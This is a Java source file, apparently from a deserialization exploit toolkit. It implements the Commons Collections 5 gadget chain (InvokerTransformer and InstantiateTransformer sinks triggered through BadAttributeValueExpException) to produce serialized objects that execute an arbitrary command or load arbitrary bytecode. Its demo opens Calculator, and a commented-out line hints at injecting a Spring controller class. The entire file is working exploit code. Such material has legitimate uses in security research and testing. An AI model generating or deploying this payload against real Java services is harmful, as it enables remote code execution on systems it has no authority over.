package xyz.eki.marshalexp.poc;

import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.gadget.jdk.GBadAttributeValueExpException;
import xyz.eki.marshalexp.utils.SerializeUtils;

public class CC5 implements POC{
    @Override
    public Object getPocObject(String cmd) throws Exception {
        Object sink = GCC.getValue2TransformerInvoke(GCC.invokerTransformer2RCE(cmd));
        Object source = GBadAttributeValueExpException.deserialize2ToString(sink);
        return source;
    }

    @Override
    public Object getPocObject(byte[] bytes) throws Exception {
        Object sink = GCC.getValue2TransformerInvoke(GCC.instantiateTransformer2RCE(bytes));
        Object source = GBadAttributeValueExpException.deserialize2ToString(sink);
        return source;
    }

    public static void main(String[] args) throws Exception {
        CC5 gen = new CC5();

        String cmd = "open /System/Applications/Calculator.app";
//        byte[] code = MiscUtils.dumpClass(MSpringController3.class);
        Object poc = gen.getPocObject(cmd);
//        Object poc = gen.getPocObject(code);
        byte[] test = SerializeUtils.serialize(poc);
        System.out.println("Deserialize");
        SerializeUtils.deserialize(test);
        //System.out.println(MiscUtils.base64Encode(test));
    }
}
